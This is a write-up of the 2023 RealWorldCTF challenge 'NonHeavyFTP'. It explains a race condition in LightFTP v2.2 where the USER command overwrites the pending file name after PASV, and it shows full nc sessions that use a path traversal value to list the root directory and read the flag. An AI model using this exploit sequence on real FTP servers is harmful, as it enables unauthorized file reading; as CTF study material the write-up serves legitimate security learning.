# 2023 RealWorldCTF - NonHeavyFTP

_NOTE: participated on the CTF but not solved during CTF_

We were given hosts and an attached archive. The attachment contained Dockerfile:
```
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update &&\
    apt-get install -y --no-install-recommends gdb wget unzip gcc make libc6-dev gnutls-dev uuid

RUN mkdir -p /server/data/ &&\
    echo "hello from LightFTP" >> /server/data/hello.txt &&\
    cd /server &&\
    wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &&\
    unzip LightFTP-2.2.zip &&\
    cd LightFTP-2.2/Source/Debug &&\
    make &&\
    cp -a ./fftp /server/ &&\
    cd /server &&\
    rm -rf LightFTP-2.2.zip

COPY ./flag /flag
COPY ./fftp.conf /server/fftp.conf

RUN mv /flag /flag.`uuid` &&\
    useradd -M -d /server/ -U ftp

WORKDIR /server

EXPOSE 2121

CMD ["runuser", "-u", "ftp", "-g", "ftp", "/server/fftp", "/server/fftp.conf"]
```

There was lightftp configuration copied into the Docker container:
```
[ftpconfig]
port=2121
maxusers=10000000
interface=0.0.0.0
local_mask=255.255.255.255

minport=30000
maxport=60000

goodbyemsg=Goodbye!
keepalive=1

[anonymous]
pswd=*
accs=readonly
root=/server/data/
```

There is a public Github repo with source code for LightFTP project available here: https://github.com/hfiref0x/LightFTP.

The solution for this challenge was in the discovery of a shared variable `context->FileName` being read and written across different FTP commands. The issue with the project during the duration of the CTF was the ability to overwrite the `context->FileName` variable with the `USER` FTP command (prior authentication is not needed) while server is waiting for the client connection to retrieve the file contents after `PASV` FTP command was issued (PASV = passive mode = opening a remote port through which the file is being served).

The ability to write to `context->FileName` is here: https://github.com/hfiref0x/LightFTP/blob/c9e473d9444ff1e8380548281bf70dd79b47c3ca/Source/ftpserv.c#L265 and read operation for the set file happens here: https://github.com/hfiref0x/LightFTP/blob/c9e473d9444ff1e8380548281bf70dd79b47c3ca/Source/ftpserv.c#L918-L935. The `context->FileName` contains one value after `PASV` and `RETR` (or `LIST`) commands are issued, but before retrieving the file over the PASV remote port, `context->FileName` can be changed via `USER` command, effectively listing or fetching any file on the server.

Here is an example using the challenge on how to list the root folder which was restricted by `fftp.conf` on the server. The communication with the FTP server is as follows:
```
$ nc -C 47.89.253.219 2221
220 LightFTP server ready
USER anonymous
331 User anonymous OK. Password required
PASS a
230 User logged in, proceed.
PASV 
227 Entering Passive Mode (0,0,0,0,226,232).
LIST /
150 File status okay; about to open data connection.
USER /../../../../../../../../../../../../
331 User /../../../../../../../../../../../../ OK. Password required
226 Transfer complete. Closing data connection.
```

The remote port for fetching the root path listing is calculated as (first\_number*256+second\_number) after `PASV` init, connection should start after `USER` command was used to traverse into another folder:
```
$ nc -C 47.89.253.219 $(echo "226*256+232" | bc)
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 opt
drwxr-xr-x  5 0 0 340 Jan 08 14:25 dev
drwxr-xr-x  2 0 0 4096 Apr 18 2022 home
drwxr-xr-x  1 0 0 4096 Nov 30 02:07 var
lrwxrwxrwx  1 0 0 9 Nov 30 02:04 lib64
drwxr-xr-x  5 0 0 4096 Nov 30 02:07 run
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 mnt
drwx------  1 0 0 4096 Jan 03 05:25 root
drwxr-xr-x  1 0 0 4096 Nov 30 02:04 usr
lrwxrwxrwx  1 0 0 7 Nov 30 02:04 bin
dr-xr-xr-x  13 0 0 0 Jan 03 12:45 sys
drwxr-xr-x  2 0 0 4096 Apr 18 2022 boot
lrwxrwxrwx  1 0 0 8 Nov 30 02:04 sbin
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 srv
drwxr-xr-x  1 0 0 4096 Jan 08 14:25 etc
lrwxrwxrwx  1 0 0 9 Nov 30 02:04 lib32
lrwxrwxrwx  1 0 0 10 Nov 30 02:04 libx32
drwxr-xr-x  2 0 0 4096 Nov 30 02:04 media
drwxrwxrwt  2 0 0 4096 Nov 30 02:07 tmp
dr-xr-xr-x  173 0 0 0 Jan 08 14:25 proc
lrwxrwxrwx  1 0 0 7 Nov 30 02:04 lib
-rwxr-xr-x  1 0 0 0 Jan 08 14:25 .dockerenv
-rw-r--r--  1 0 0 48 Jan 03 05:28 flag.018448a6-8dbe-11ed-a1c5-0242ac110002
drwxr-xr-x  1 0 0 4096 Jan 06 12:31 server
```
To fetch the flag, we use the same approach, just switch from `LIST` to `RETR`. Additional requirement for fetching files is that the `RETR` command must point to a file that exists and is available to the guest:
```
USER anonymous
331 User anonymous OK. Password required
PASS a
230 User logged in, proceed.
PASV
227 Entering Passive Mode (0,0,0,0,222,125).
RETR hello.txt                                    
150 File status okay; about to open data connection.
USER /flag.018448a6-8dbe-11ed-a1c5-0242ac110002
331 User /flag.018448a6-8dbe-11ed-a1c5-0242ac110002 OK. Password required
226 Transfer complete. Closing data connection.
```

In another terminal to fetch the flag file content:
```
$ nc -C 47.89.253.219 $(echo "222*256+125" | bc)
rwctf{race-c0nd1tion-1s-real1y_ha4d_pr0blem!!!}
```
